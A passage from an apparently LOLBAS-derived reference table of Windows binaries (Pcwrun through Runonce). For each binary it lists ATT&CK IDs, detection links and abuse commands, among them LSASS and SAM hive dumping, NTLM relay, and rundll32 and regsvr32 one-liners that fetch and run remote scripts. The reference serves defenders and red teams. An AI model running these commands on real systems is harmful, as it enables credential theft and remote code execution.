- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Pcwrun.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Pcwrun.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Pcwrun.yml`
- **Default Windows Paths:** `C:\Windows\System32\pcwrun.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_pcwrun_follina.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `Pcwrun.exe c:\temp\beacon.exe` | Proxy execution of binary |
| **Execute** | `T1202` | `User` | `Pcwrun.exe /../../$(calc).exe` | Proxy execution of binary |

### `Pktmon.exe` (`yml/OSBinaries/Pktmon.yml`)
- **Description:** Capture Network Packets on the windows 10 with October 2018 Update or later.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Pktmon.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Pktmon.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Pktmon.yml`
- **Default Windows Paths:** `c:\windows\system32\pktmon.exe`, `c:\windows\syswow64\pktmon.exe`
- **Key Forensic / Hunt IOCs:** `.etl files found on system`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_pktmon.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1040` | `Administrator` | `pktmon.exe start --etw` | use this a built in network sniffer on windows 10 to capture senstive traffic |
| **Reconnaissance** | `T1040` | `Administrator` | `pktmon.exe filter add -p 445` | Look for interesting traffic such as telent or FTP |

### `Pnputil.exe` (`yml/OSBinaries/Pnputil.yml`)
- **Description:** Used for installing drivers
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Pnputil.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Pnputil.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Pnputil.yml`
- **Default Windows Paths:** `C:\Windows\system32\pnputil.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_susp_driver_installed_by_pnputil.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1547` | `Administrator` | `pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf` | Add malicious driver |

### `Presentationhost.exe` (`yml/OSBinaries/Presentationhost.yml`)
- **Description:** File is used for executing Browser applications
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Presentationhost.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Presentationhost.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Presentationhost.yml`
- **Default Windows Paths:** `C:\Windows\System32\Presentationhost.exe`, `C:\Windows\SysWOW64\Presentationhost.exe`
- **Key Forensic / Hunt IOCs:** `Execution of .xbap files may not be common on production workstations`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost_download.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_presentationhost.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `Presentationhost.exe C:\temp\Evil.xbap` | Execute code within xbap files |
| **Download** | `T1105` | `User` | `Presentationhost.exe https://example.com/payload` | Downloads payload from remote server |

### `Print.exe` (`yml/OSBinaries/Print.yml`)
- **Description:** Used by Windows to send files to the printer
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Print.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Print.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Print.yml`
- **Default Windows Paths:** `C:\Windows\System32\print.exe`, `C:\Windows\SysWOW64\print.exe`
- **Key Forensic / Hunt IOCs:** `Print.exe retrieving files from internet`; `Print.exe creating executable files on disk`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe` | Hide binary file in alternate data stream to potentially bypass defensive counter measures |
| **Copy** | `T1105` | `User` | `print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe` | Copy files |
| **Copy** | `T1105` | `User` | `print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe` | Copy/Download file from remote server |

### `PrintBrm.exe` (`yml/OSBinaries/PrintBrm.yml`)
- **Description:** Printer Migration Command-Line Tool
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/PrintBrm.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/PrintBrm.yml`
- **Default Windows Paths:** `C:\Windows\System32\spool\tools\PrintBrm.exe`
- **Key Forensic / Hunt IOCs:** `PrintBrm.exe should not be run on a normal workstation`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_lolbin_printbrm.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Download** | `T1105` | `User` | `PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip` | Exfiltrate the contents of a remote folder on a UNC share into a zip file |
| **ADS** | `T1564.004` | `User` | `PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder` | Decompress and extract a ZIP file stored on an alternate data stream to a new folder |

### `Provlaunch.exe` (`yml/OSBinaries/Provlaunch.yml`)
- **Description:** Launcher process
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Provlaunch.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Provlaunch.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Provlaunch.yml`
- **Default Windows Paths:** `c:\windows\system32\provlaunch.exe`
- **Key Forensic / Hunt IOCs:** `c:\windows\system32\provlaunch.exe executions`; `Creation/existence of HKLM\SOFTWARE\Microsoft\Provisioning\Commands subkeys`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/process_creation/proc_creation_win_provlaunch_potential_abuse.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/process_creation/proc_creation_win_provlaunch_susp_child_process.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/process_creation/proc_creation_win_registry_provlaunch_provisioning_command.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/9cb124f841c4358ca859e8474d6e7bb5268284a2/rules/windows/registry/registry_set/registry_set_provisioning_command_abuse.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `Administrator` | `provlaunch.exe LOLBin` | Executes arbitrary command |

### `Psr.exe` (`yml/OSBinaries/Psr.yml`)
- **Description:** Windows Problem Steps Recorder, used to record screen and clicks.
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Psr.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Psr.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Psr.yml`
- **Default Windows Paths:** `c:\windows\system32\psr.exe`, `c:\windows\syswow64\psr.exe`
- **Key Forensic / Hunt IOCs:** `psr.exe spawned`; `suspicious activity when running with "/gui 0" flag`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_psr_capture_screenshots.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1113` | `User` | `psr.exe /start /output D:\test.zip /sc 1 /gui 0` | Can be used to take screenshots of the user environment |

### `Rasautou.exe` (`yml/OSBinaries/Rasautou.yml`)
- **Description:** Windows Remote Access Dialer
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Rasautou.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Rasautou.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Rasautou.yml`
- **Default Windows Paths:** `C:\Windows\System32\rasautou.exe`
- **Key Forensic / Hunt IOCs:** `rasautou.exe command line containing -d and -p`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/08ca62cc8860f4660e945805d0dd615ce75258c1/rules/windows/process_creation/win_rasautou_dll_execution.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User, Administrator in Windows 8` | `rasautou -d powershell.dll -p powershell -a a -e e` | Execute DLL code |

### `rdrleakdiag.exe` (`yml/OSBinaries/Rdrleakdiag.yml`)
- **Description:** Microsoft Windows resource leak diagnostic tool
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Rdrleakdiag.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Rdrleakdiag.yml`
- **Default Windows Paths:** `c:\windows\system32\rdrleakdiag.exe`, `c:\Windows\SysWOW64\rdrleakdiag.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_rdrleakdiag_process_dumping.yml), [Elastic](https://www.elastic.co/guide/en/security/current/potential-credential-access-via-windows-utilities.html), [Elastic](https://github.com/elastic/detection-rules/blob/5bdf70e72c6cd4547624c521108189af994af449/rules/windows/credential_access_cmdline_dump_tool.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Dump** | `T1003` | `User` | `rdrleakdiag.exe /p 940 /o c:\evil /fullmemdmp /wait 1` | Dump process by PID. |
| **Dump** | `T1003.001` | `Administrator` | `rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1` | Dump LSASS process. |
| **Dump** | `T1003.001` | `Administrator` | `rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /snap` | Dump LSASS process mutliple times. |

### `Reg.exe` (`yml/OSBinaries/Reg.yml`)
- **Description:** Used to manipulate the registry
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Reg.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Reg.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Reg.yml`
- **Default Windows Paths:** `C:\Windows\System32\reg.exe`, `C:\Windows\SysWOW64\reg.exe`
- **Key Forensic / Hunt IOCs:** `reg.exe writing to an ADS`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regedit_import_keys.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml), [Splunk](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/attempted_credential_dump_from_registry_via_reg_exe.yml), [Elastic](https://github.com/elastic/detection-rules/blob/f6421d8c534f295518a2c945f530e8afc4c8ad1b/rules/windows/credential_access_dump_registry_hives.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg` | Hide/plant registry information in Alternate data stream for later use |
| **Credentials** | `T1003.002` | `Administrator` | `reg save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak` | Dump credentials from the Security Account Manager (SAM) |

### `Regasm.exe` (`yml/OSBinaries/Regasm.yml`)
- **Description:** Part of .NET
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Regasm.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Regasm.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Regasm.yml`
- **Default Windows Paths:** `C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe`, `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe`, `C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe`, `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe`
- **Key Forensic / Hunt IOCs:** `regasm.exe executing dll file`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_regasm.yml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml), [Splunk](https://github.com/splunk/security_content/blob/bc93e670f5dcb24e96fbe3664d6bcad92df5acad/docs/_stories/suspicious_regsvcs_regasm_activity.md), [Splunk](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_regasm_with_network_connection.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.009` | `Local Admin` | `regasm.exe AllTheThingsx64.dll` | Execute code and bypass Application whitelisting |
| **Execute** | `T1218.009` | `User` | `regasm.exe /U AllTheThingsx64.dll` | Execute code and bypass Application whitelisting |

### `Regedit.exe` (`yml/OSBinaries/Regedit.yml`)
- **Description:** Used by Windows to manipulate registry
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Regedit.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Regedit.yml`
- **Default Windows Paths:** `C:\Windows\regedit.exe`
- **Key Forensic / Hunt IOCs:** `regedit.exe reading and writing to alternate data stream`; `regedit.exe should normally not be executed by end-users`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_regedit_import_keys_ads.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey` | Hide registry data in alternate data stream |
| **ADS** | `T1564.004` | `User` | `regedit C:\ads\file.txt:regfile.reg` | Import hidden registry data from alternate data stream |

### `Regini.exe` (`yml/OSBinaries/Regini.yml`)
- **Description:** Used to manipulate the registry
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Regini.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Regini.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Regini.yml`
- **Default Windows Paths:** `C:\Windows\System32\regini.exe`, `C:\Windows\SysWOW64\regini.exe`
- **Key Forensic / Hunt IOCs:** `regini.exe reading from ADS`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regini_ads.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_regini_execution.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **ADS** | `T1564.004` | `User` | `regini.exe newfile.txt:hidden.ini` | Write to registry |

### `Register-cimprovider.exe` (`yml/OSBinaries/Register-cimprovider.yml`)
- **Description:** Used to register new wmi providers
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Register-cimprovider.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Register-cimprovider.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Register-cimprovider.yml`
- **Default Windows Paths:** `C:\Windows\System32\Register-cimprovider.exe`, `C:\Windows\SysWOW64\Register-cimprovider.exe`
- **Key Forensic / Hunt IOCs:** `Register-cimprovider.exe execution and cmdline DLL load may be supsicious`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/35a7244c62820fbc5a832e50b1e224ac3a1935da/rules/windows/process_creation/proc_creation_win_susp_register_cimprovider.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `Register-cimprovider -path "C:\folder\evil.dll"` | Execute code within dll file |

### `Regsvcs.exe` (`yml/OSBinaries/Regsvcs.yml`)
- **Description:** Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Regsvcs.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Regsvcs.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Regsvcs.yml`
- **Default Windows Paths:** `c:\Windows\Microsoft.NET\Framework\v*\regsvcs.exe`, `c:\Windows\Microsoft.NET\Framework64\v*\regsvcs.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_regasm.yml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml), [Splunk](https://github.com/splunk/security_content/blob/bee2a4cefa533f286c546cbe6798a0b5dec3e5ef/detections/endpoint/detect_regsvcs_with_network_connection.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.009` | `User` | `regsvcs.exe AllTheThingsx64.dll` | Execute dll file and bypass Application whitelisting |
| **AWL Bypass** | `T1218.009` | `Local Admin` | `regsvcs.exe AllTheThingsx64.dll` | Execute dll file and bypass Application whitelisting |

### `Regsvr32.exe` (`yml/OSBinaries/Regsvr32.yml`)
- **Description:** Used by Windows to register dlls
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Regsvr32.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Regsvr32.yml`
- **Default Windows Paths:** `C:\Windows\System32\regsvr32.exe`, `C:\Windows\SysWOW64\regsvr32.exe`
- **Key Forensic / Hunt IOCs:** `regsvr32.exe retrieving files from Internet`; `regsvr32.exe executing scriptlet (sct) files`; `DotNet CLR libraries loaded into regsvr32.exe`; `DotNet CLR Usage Log - regsvr32.exe.log`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_parent.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_child_process.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_susp_exec_path_1.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_regsvr32_network_activity.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **AWL Bypass** | `T1218.010` | `User` | `regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll` | Execute code from remote scriptlet, bypass Application whitelisting |
| **AWL Bypass** | `T1218.010` | `User` | `regsvr32.exe /s /u /i:file.sct scrobj.dll` | Execute code from scriptlet, bypass Application whitelisting |
| **Execute** | `T1218.010` | `User` | `regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll` | Execute code from remote scriptlet, bypass Application whitelisting |
| **Execute** | `T1218.010` | `User` | `regsvr32.exe /s /u /i:file.sct scrobj.dll` | Execute code from scriptlet, bypass Application whitelisting |

### `Replace.exe` (`yml/OSBinaries/Replace.yml`)
- **Description:** Used to replace file with another file
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Replace.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Replace.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Replace.yml`
- **Default Windows Paths:** `C:\Windows\System32\replace.exe`, `C:\Windows\SysWOW64\replace.exe`
- **Key Forensic / Hunt IOCs:** `Replace.exe retrieving files from remote server`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Copy** | `T1105` | `User` | `replace.exe C:\Source\File.cab C:\Destination /A` | Copy files |
| **Download** | `T1105` | `User` | `replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A` | Download file |

### `Rpcping.exe` (`yml/OSBinaries/Rpcping.yml`)
- **Description:** Used to verify rpc connection
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Rpcping.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Rpcping.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Rpcping.yml`
- **Default Windows Paths:** `C:\Windows\System32\rpcping.exe`, `C:\Windows\SysWOW64\rpcping.exe`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_rpcping_credential_capture.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Credentials** | `T1003` | `User` | `rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM` | Capture credentials on a non-standard port |
| **Credentials** | `T1187` | `User` | `rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM` | Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port |

### `Rundll32.exe` (`yml/OSBinaries/Rundll32.yml`)
- **Description:** Used by Windows to execute dll files
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Rundll32.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Rundll32.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Rundll32.yml`
- **Default Windows Paths:** `C:\Windows\System32\rundll32.exe`, `C:\Windows\SysWOW64\rundll32.exe`
- **Key Forensic / Hunt IOCs:** `Outbount Internet/network connections made from rundll32`; `Suspicious use of cmdline flags such as -sta`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml), [Sigma](https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml), [Elastic](https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_unusual_network_connection_via_rundll32.toml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218.011` | `User` | `rundll32.exe AllTheThingsx64,EntryPoint` | Execute dll file |
| **Execute** | `T1218.011` | `User` | `rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint` | Execute DLL from SMB share. |
| **Execute** | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');")` | Execute code from Internet |
| **Execute** | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");` | Proxy execution |
| **Execute** | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}` | Proxy execution |
| **Execute** | `T1218.011` | `User` | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")` | Execute code from Internet |
| **ADS** | `T1564.004` | `User` | `rundll32 "C:\ads\file.txt:ADSDLL.dll",DllMain` | Execute code from alternate data stream |
| **Execute** | `T1218.011` | `User` | `rundll32.exe -sta {CLSID}` | Execute a DLL/EXE COM server payload or ScriptletURL code. |

### `Runexehelper.exe` (`yml/OSBinaries/Runexehelper.yml`)
- **Description:** Launcher process
- **CROW Innovations LOLBAS Source:** [`yml/OSBinaries/Runexehelper.yml`](https://github.com/CROWInnovations/LOLBAS/blob/master/yml/OSBinaries/Runexehelper.yml) | Raw YAML: `https://raw.githubusercontent.com/CROWInnovations/LOLBAS/master/yml/OSBinaries/Runexehelper.yml`
- **Default Windows Paths:** `c:\windows\system32\runexehelper.exe`
- **Key Forensic / Hunt IOCs:** `c:\windows\system32\runexehelper.exe is run`; `Existence of runexewithargs_output.txt file`
- **Detection Rules:** [Sigma](https://github.com/SigmaHQ/sigma/blob/197615345b927682ab7ad7fa3c5f5bb2ed911eed/rules/windows/process_creation/proc_creation_win_lolbin_runexehelper.yml)

| Category | MITRE ATT&CK | Privileges | Verified Command (`CMD` / `PowerShell`) | Tactical Use Case |
| :--- | :--- | :--- | :--- | :--- |
| **Execute** | `T1218` | `User` | `runexehelper.exe c:\windows\system32\calc.exe` | Executes arbitrary code |

### `Runonce.exe` (`yml/OSBinaries/Runonce.yml`)
- **Description:** Executes a Run Once Task that has been configured in the registry
